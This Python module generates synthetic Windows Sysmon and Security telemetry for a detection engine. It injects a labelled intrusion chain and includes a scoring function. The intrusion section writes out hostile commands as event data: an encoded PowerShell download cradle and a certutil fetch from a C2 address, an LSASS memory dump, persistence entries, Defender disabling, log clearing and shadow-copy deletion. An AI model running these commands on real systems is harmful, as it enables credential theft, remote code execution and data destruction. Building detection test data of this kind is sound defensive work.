"""Synthetic Windows telemetry with an embedded intrusion, for demos and tests.

Produces three files:

* ``baseline.jsonl`` — three "clean" working days for 14 hosts (learning data).
* ``hunt.jsonl``     — a fourth day: normal activity + a full intrusion chain
  (phishing -> PowerShell -> LOLBin -> C2 beacon -> LSASS dump -> persistence ->
  masquerading implant -> DNS tunnel -> lateral movement -> defence evasion ->
  shadow-copy deletion -> mass encryption).
* ``ground_truth.json`` — which injected ``RecordID`` belongs to which hypothesis.

The data is synthetic and simplified. It exercises the engine; it is not a
substitute for validation against real intrusion telemetry.
"""
from __future__ import annotations

import base64
import json
import os
import random
import string
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Tuple

SYSMON = "Microsoft-Windows-Sysmon/Operational"
SEC = "Security"
SYS = "System"

USERS = ["alice", "bob", "carol", "dinesh", "fatima", "gopal", "hari", "irfan", "jaya", "kiran", "latha", "manoj"]
WORKSTATIONS = [f"WS-{i:02d}.talfor.lab" for i in range(1, 13)]
SERVERS = ["SRV-01.talfor.lab", "DC-01.talfor.lab"]

P = {
    "explorer": r"C:\Windows\explorer.exe",
    "userinit": r"C:\Windows\System32\userinit.exe",
    "services": r"C:\Windows\System32\services.exe",
    "svchost": r"C:\Windows\System32\svchost.exe",
    "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "outlook": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    "winword": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    "excel": r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
    "teams": r"C:\Users\{u}\AppData\Local\Microsoft\Teams\current\Teams.exe",
    "onedrive": r"C:\Users\{u}\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
    "cmd": r"C:\Windows\System32\cmd.exe",
    "powershell": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    "ipconfig": r"C:\Windows\System32\ipconfig.exe",
    "ping": r"C:\Windows\System32\PING.EXE",
    "notepad": r"C:\Windows\System32\notepad.exe",
    "taskhostw": r"C:\Windows\System32\taskhostw.exe",
    "wmiprvse": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
    "runtimebroker": r"C:\Windows\System32\RuntimeBroker.exe",
    "searchprotocolhost": r"C:\Windows\System32\SearchProtocolHost.exe",
    "backgroundtaskhost": r"C:\Windows\System32\backgroundTaskHost.exe",
    "msiexec": r"C:\Windows\System32\msiexec.exe",
    "googleupdate": r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
    "msmpeng": r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090-11\MsMpEng.exe",
    "rundll32": r"C:\Windows\System32\rundll32.exe",
    "certutil": r"C:\Windows\System32\certutil.exe",
    "schtasks": r"C:\Windows\System32\schtasks.exe",
    "vssadmin": r"C:\Windows\System32\vssadmin.exe",
    "wevtutil": r"C:\Windows\System32\wevtutil.exe",
    "lsass": r"C:\Windows\System32\lsass.exe",
    "conhost": r"C:\Windows\System32\conhost.exe",
    "agent": r"C:\Program Files\Zabbix Agent\zabbix_agentd.exe",
}

# (parent, child, [command lines], weight)
BENIGN_PROCS: List[Tuple[str, str, List[str], int]] = [
    ("explorer", "chrome", ['"{img}"', '"{img}" --profile-directory=Default', '"{img}" --type=renderer --lang=en-GB'], 18),
    ("chrome", "chrome", ['"{img}" --type=renderer --field-trial-handle={n}', '"{img}" --type=gpu-process --field-trial-handle={n}',
                          '"{img}" --type=utility --utility-sub-type=network.mojom.NetworkService --field-trial-handle={n}'], 30),
    ("explorer", "outlook", ['"{img}"', '"{img}" /recycle'], 6),
    ("explorer", "winword", ['"{img}" /n "C:\\Users\\{u}\\Documents\\report_{n}.docx"', '"{img}"'], 6),
    ("outlook", "winword", ['"{img}" /n "C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q{n}\\minutes_{n}.docx" /o ""'], 3),
    ("explorer", "excel", ['"{img}" "C:\\Users\\{u}\\Documents\\budget_{n}.xlsx"', '"{img}"'], 5),
    ("explorer", "teams", ['"{img}" --processStart "Teams.exe"', '"{img}" --system-initiated'], 4),
    ("explorer", "onedrive", ['"{img}" /background'], 3),
    ("explorer", "notepad", ['"{img}" C:\\Users\\{u}\\Desktop\\notes_{n}.txt'], 3),
    ("explorer", "cmd", ['"{img}"'], 1),
    ("cmd", "ipconfig", ['ipconfig /all', 'ipconfig /flushdns'], 1),
    ("cmd", "ping", ['ping 10.10.1.{o}', 'ping intranet.talfor.lab'], 1),
    ("explorer", "powershell", ['"{img}" -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1',
                                '"{img}" -NoProfile -Command Get-Service | Out-File C:\\Temp\\svc.txt'], 1),
    ("powershell", "conhost", ['\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'], 1),
    ("services", "svchost", ['C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule',
                             'C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p',
                             'C:\\Windows\\System32\\svchost.exe -k wsappx -p -s AppXSvc',
                             'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s BITS'], 10),
    ("svchost", "taskhostw", ['taskhostw.exe {{222A245B-E637-4AE9-A93F-A59CA119A75E}}', 'taskhostw.exe Install $(Arg0)'], 6),
    ("svchost", "wmiprvse", ['C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding',
                             'C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding'], 4),
    ("svchost", "runtimebroker", ['C:\\Windows\\System32\\RuntimeBroker.exe -Embedding'], 8),
    ("svchost", "searchprotocolhost", ['"C:\\Windows\\system32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe{n}'], 6),
    ("svchost", "backgroundtaskhost", ['"C:\\Windows\\system32\\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca'], 5),
    ("svchost", "googleupdate", ['"{img}" /ua /installsource scheduler', '"{img}" /c'], 3),
    ("services", "msiexec", ['C:\\Windows\\system32\\msiexec.exe /V'], 1),
    ("userinit", "explorer", ['C:\\Windows\\Explorer.EXE'], 1),
]

BENIGN_DOMAINS = ["www.google.com", "mail.google.com", "outlook.office365.com", "login.microsoftonline.com",
                  "teams.microsoft.com", "www.linkedin.com", "intranet.talfor.lab", "github.com",
                  "api.github.com", "fonts.gstatic.com", "www.youtube.com", "r4---sn-ci5gup-cvhs.googlevideo.com",
                  "d3k81ch9hvuctc.cloudfront.net", "e8652.dscx.akamaiedge.net", "www.bseindia.com",
                  "news.ycombinator.com", "talfor.in", "academy.talfor.in", "update.googleapis.com",
                  "ctldl.windowsupdate.com", "ocsp.digicert.com", "www.irctc.co.in", "www.icicibank.com"]
PUBLIC_IPS = ["142.250.183.{o}", "13.107.42.{o}", "52.97.146.{o}", "20.190.159.{o}", "140.82.112.{o}",
              "104.244.42.{o}", "151.101.1.{o}", "23.45.67.{o}"]

C2_IP = "185.220.101.7"
TUNNEL_DOMAIN = "cdn-sync-update.xyz"


class Gen:
    def __init__(self, seed: int = 46):
        self.rng = random.Random(seed)
        self.rec = 100000
        self.events: List[Dict[str, Any]] = []
        self.truth: Dict[str, List[str]] = {}

    def _rid(self, scenario: str | None) -> str:
        self.rec += 1
        if scenario:
            rid = f"ATK-{scenario}-{self.rec}"
            self.truth.setdefault(scenario, []).append(rid)
            return rid
        return str(self.rec)

    def emit(self, t: datetime, channel: str, eid: int, host: str, scenario: str | None = None, **fields):
        ev = {"EventID": eid, "Channel": channel, "Computer": host,
              "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "RecordID": self._rid(scenario)}
        ev.update(fields)
        self.events.append(ev)
        return ev

    def proc(self, t, host, user, parent_img, img, cmd, scenario=None, pguid=None):
        return self.emit(t, SYSMON, 1, host, scenario, Image=img, ParentImage=parent_img, CommandLine=cmd,
                         User=f"TALFOR\\{user}", ProcessGuid="{%s}" % self.rng.getrandbits(64),
                         IntegrityLevel="Medium", ParentCommandLine="")

    # ------------------------------------------------------------------ benign
    def benign_day(self, day: datetime, logon_map: Dict[str, List[str]], onedrive_runkey_hosts=()):
        r = self.rng
        hosts = WORKSTATIONS + SERVERS
        for hi, host in enumerate(hosts):
            user = USERS[hi % len(USERS)] if host in WORKSTATIONS else "svc_backup"
            # working day 09:00-18:30 IST == 03:30-13:00 UTC; servers run 24h
            start = day + timedelta(hours=3, minutes=30 + r.randint(-20, 20))
            span = 9.5 * 3600 if host in WORKSTATIONS else 24 * 3600
            if host not in WORKSTATIONS:
                start = day
            n_proc = r.randint(110, 170) if host in WORKSTATIONS else r.randint(50, 80)
            weights = [w for *_, w in BENIGN_PROCS]
            for _ in range(n_proc):
                t = start + timedelta(seconds=r.uniform(0, span))
                parent, child, cmds, _w = r.choices(BENIGN_PROCS, weights=weights)[0]
                if host not in WORKSTATIONS and parent in ("explorer", "chrome", "outlook"):
                    parent, child, cmds = "services", "svchost", BENIGN_PROCS[14][2]
                img = P[child].format(u=user)
                cmd = r.choice(cmds).format(img=img, u=user, n=r.randint(1, 9999), o=r.randint(2, 250))
                self.proc(t, host, user, P[parent].format(u=user), img, cmd)
            # network
            for _ in range(r.randint(60, 120) if host in WORKSTATIONS else 30):
                t = start + timedelta(seconds=r.uniform(0, span))
                ip = r.choice(PUBLIC_IPS).format(o=r.randint(1, 254))
                self.emit(t, SYSMON, 3, host, Image=P["chrome"], User=f"TALFOR\\{user}", Protocol="tcp",
                          Initiated="true", SourceIp=f"10.10.1.{hi + 10}", DestinationIp=ip, DestinationPort="443")
            # monitoring agent: periodic but jittery, internal destination
            t = day
            while t < day + timedelta(days=1):
                t += timedelta(seconds=300 + r.gauss(0, 90))
                self.emit(t, SYSMON, 3, host, Image=P["agent"], User="NT AUTHORITY\\SYSTEM", Protocol="tcp",
                          Initiated="true", SourceIp=f"10.10.1.{hi + 10}", DestinationIp="10.10.0.5", DestinationPort="10051")
            # DNS
            for _ in range(r.randint(80, 140) if host in WORKSTATIONS else 20):
                t = start + timedelta(seconds=r.uniform(0, span))
                self.emit(t, SYSMON, 22, host, Image=P["chrome"], QueryName=r.choice(BENIGN_DOMAINS),
                          QueryStatus="0", User=f"TALFOR\\{user}")
            # files
            for _ in range(r.randint(20, 60)):
                t = start + timedelta(seconds=r.uniform(0, span))
                self.emit(t, SYSMON, 11, host, Image=P["winword"],
                          TargetFilename=f"C:\\Users\\{user}\\Documents\\~$report_{r.randint(1, 99)}.docx")
            # Defender touching LSASS (benign, trusted source)
            for _ in range(r.randint(1, 3)):
                t = start + timedelta(seconds=r.uniform(0, span))
                self.emit(t, SYSMON, 10, host, SourceImage=P["msmpeng"], TargetImage=P["lsass"], GrantedAccess="0x1410")
            # logons
            for target in logon_map.get(user, []):
                t = start + timedelta(seconds=r.uniform(0, span))
                self.emit(t, SEC, 4624, target, TargetUserName=user, LogonType="3",
                          IpAddress=f"10.10.1.{hi + 10}", WorkstationName=host.split(".")[0])
            if host in onedrive_runkey_hosts:
                t = start + timedelta(seconds=r.uniform(0, span))
                od = P["onedrive"].format(u=user)
                self.emit(t, SYSMON, 13, host, EventType="SetValue", Image=od,
                          TargetObject=f"HKU\\S-1-5-21-{hi}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
                          Details=f'"{od}" /background')

    # ------------------------------------------------------------------ attack
    def intrusion(self, t0: datetime):
        r = self.rng
        ws, srv, u = "WS-07.talfor.lab", "SRV-01.talfor.lab", "carol"
        t = t0
        ps_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://%s/s.ps1')" % C2_IP
        enc = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
        self.proc(t, ws, u, P["explorer"], P["outlook"], f'"{P["outlook"]}"')
        t += timedelta(minutes=2)
        self.proc(t, ws, u, P["outlook"], P["winword"],
                  f'"{P["winword"]}" /n "C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X1\\Invoice_Oct.docm" /o ""')
        t += timedelta(seconds=40)
        self.proc(t, ws, u, P["winword"], P["powershell"], f"powershell.exe -nop -w hidden -enc {enc}", "H01-H03")
        t += timedelta(seconds=20)
        self.proc(t, ws, u, P["powershell"], P["certutil"],
                  f"certutil.exe -urlcache -split -f http://{C2_IP}/a.png C:\\Users\\{u}\\AppData\\Local\\Temp\\a.dll", "H05")
        t += timedelta(seconds=15)
        self.proc(t, ws, u, P["powershell"], P["rundll32"],
                  f"rundll32.exe C:\\Users\\{u}\\AppData\\Local\\Temp\\a.dll,Start", "CHAIN")
        # C2 beacon every 60s +/- 1.5s
        bt = t
        for _ in range(30):
            bt += timedelta(seconds=60 + r.uniform(-1.5, 1.5))
            self.emit(bt, SYSMON, 3, ws, "H04", Image=P["rundll32"], User=f"TALFOR\\{u}", Protocol="tcp",
                      Initiated="true", SourceIp="10.10.1.16", DestinationIp=C2_IP, DestinationPort="443")
        # LSASS dump via comsvcs
        t += timedelta(minutes=6)
        self.proc(t, ws, u, P["powershell"], P["rundll32"],
                  f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\{u}\\AppData\\Local\\Temp\\d.bin full", "CHAIN")
        self.emit(t + timedelta(seconds=1), SYSMON, 10, ws, "H02", SourceImage=P["rundll32"], TargetImage=P["lsass"],
                  GrantedAccess="0x1fffff", CallTrace="C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\comsvcs.dll+2b1e")
        # Persistence
        implant = f"C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\svchost.exe"
        t += timedelta(minutes=3)
        self.emit(t, SYSMON, 13, ws, "H06", EventType="SetValue", Image=P["powershell"],
                  TargetObject="HKU\\S-1-5-21-7\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdate", Details=implant)
        t += timedelta(seconds=30)
        self.proc(t, ws, u, P["powershell"], P["schtasks"],
                  f'schtasks.exe /create /sc onlogon /tn "OneDriveSync" /tr "{implant}" /f', "H06")
        # Masquerading implant — no rule covers this; the learning layer must catch it
        t += timedelta(minutes=4)
        self.proc(t, ws, u, P["svchost"], implant, f"{implant} -k netsvc -p {r.getrandbits(48):x}", "ML")
        # DNS tunnelling
        dt = t
        for _ in range(120):
            dt += timedelta(seconds=r.uniform(0.5, 2.5))
            label = "".join(r.choice(string.ascii_lowercase + string.digits) for _ in range(r.randint(30, 50)))
            self.emit(dt, SYSMON, 22, ws, "H10", Image=implant, QueryName=f"{label}.{TUNNEL_DOMAIN}", QueryStatus="0",
                      User=f"TALFOR\\{u}")
        # Lateral movement to SRV-01 (carol never logs on to SRV-01 in baseline)
        t += timedelta(minutes=12)
        self.emit(t, SEC, 4624, srv, "H07b", TargetUserName=u, LogonType="3", IpAddress="10.10.1.16",
                  WorkstationName="WS-07")
        t += timedelta(seconds=5)
        self.proc(t, srv, u, P["wmiprvse"], P["cmd"],
                  "cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1696512345.42 2>&1", "H07")
        # Defence evasion
        t += timedelta(minutes=2)
        self.proc(t, srv, u, P["cmd"], P["powershell"],
                  "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", "H09")
        t += timedelta(seconds=20)
        self.proc(t, srv, u, P["cmd"], P["wevtutil"], "wevtutil.exe cl Security", "H09")
        self.emit(t + timedelta(seconds=1), SEC, 1102, srv, "H09", SubjectUserName=u)
        # Ransomware precursor + mass encryption
        t += timedelta(minutes=1)
        self.proc(t, srv, u, P["cmd"], P["vssadmin"], "vssadmin.exe delete shadows /all /quiet", "H08")
        locker = "C:\\Users\\Public\\locker.exe"
        t += timedelta(seconds=30)
        self.proc(t, srv, u, P["cmd"], locker, f"{locker} --path D:\\Shares --ext .talf", "CHAIN")
        ft = t
        for i in range(600):
            ft += timedelta(milliseconds=r.randint(20, 90))
            self.emit(ft, SYSMON, 11, srv, "H08b", Image=locker, TargetFilename=f"D:\\Shares\\Finance\\doc_{i}.xlsx.talf")


def generate(out_dir: str, seed: int = 46) -> Dict[str, str]:
    os.makedirs(out_dir, exist_ok=True)
    rng = random.Random(seed)
    # Who logs on to which server over the network (stable across days).
    logon_map = {u: (["SRV-01.talfor.lab"] if i % 2 == 0 and u != "carol" else []) + ["DC-01.talfor.lab"]
                 for i, u in enumerate(USERS)}
    base_day = datetime(2026, 9, 28, tzinfo=timezone.utc)

    g = Gen(seed)
    for d in range(3):
        g.benign_day(base_day + timedelta(days=d), logon_map)
    g.events.sort(key=lambda e: e["UtcTime"])
    baseline = os.path.join(out_dir, "baseline.jsonl")
    with open(baseline, "w") as fh:
        for ev in g.events:
            fh.write(json.dumps(ev) + "\n")

    h = Gen(seed + 1)
    h.rec = 900000
    hunt_day = base_day + timedelta(days=3)
    h.benign_day(hunt_day, logon_map, onedrive_runkey_hosts=("WS-02.talfor.lab", "WS-05.talfor.lab", "WS-09.talfor.lab",
                                                            "WS-11.talfor.lab"))
    h.intrusion(hunt_day + timedelta(hours=4, minutes=45 + rng.randint(0, 10)))
    h.events.sort(key=lambda e: e["UtcTime"])
    hunt = os.path.join(out_dir, "hunt.jsonl")
    with open(hunt, "w") as fh:
        for ev in h.events:
            fh.write(json.dumps(ev) + "\n")
    truth = os.path.join(out_dir, "ground_truth.json")
    with open(truth, "w") as fh:
        json.dump(h.truth, fh, indent=1)
    return {"baseline": baseline, "hunt": hunt, "truth": truth,
            "baseline_events": str(len(g.events)), "hunt_events": str(len(h.events))}


def evaluate(alerts: List[Dict[str, Any]], truth: Dict[str, List[str]]) -> Dict[str, Any]:
    rid_to_scn = {rid: s for s, ids in truth.items() for rid in ids}
    detected: Dict[str, List[str]] = {}
    false_pos = []
    for a in alerts:
        rid = str(a.get("event", {}).get("RecordID", ""))
        scn = rid_to_scn.get(rid)
        if scn:
            detected.setdefault(scn, []).extend(a["rules"])
        else:
            false_pos.append(a)
    scenarios = sorted(s for s in truth if s != "CHAIN")
    return {
        "scenarios": scenarios,
        "detected": {s: sorted(set(detected.get(s, []))) for s in scenarios},
        "missed": [s for s in scenarios if s not in detected],
        "chain_events_flagged": sorted(set(detected.get("CHAIN", []))),
        "false_positives": len(false_pos),
        "false_positive_rules": sorted({r for a in false_pos for r in a["rules"]}),
        "fp_alerts": false_pos,
    }
